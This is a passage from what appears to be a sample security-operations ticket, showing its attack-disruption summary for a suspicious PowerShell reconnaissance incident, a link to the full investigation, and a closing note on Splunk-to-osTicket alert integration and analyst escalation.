- Automated workflow enabled rapid response

**Attack Disruption Success:**
- Reconnaissance partially completed (some risk)
- No persistence established (good)
- No data exfiltration (good)
- No lateral movement (good)
- Attack chain broken at early stage (excellent)

**Link to Full Investigation:** [Investigation 004: Suspicious PowerShell Activity](../../investigations/investigation-004-suspicious-powershell.md)

---

*This sample ticket demonstrates automated Splunk-to-osTicket integration, showcasing how SIEM alerts automatically create tickets with complete context, enabling rapid SOC response to sophisticated reconnaissance attacks. The ticket illustrates effective Tier 1 to Tier 2 escalation, comprehensive investigation methodology, and successful attack disruption before significant compromise.*
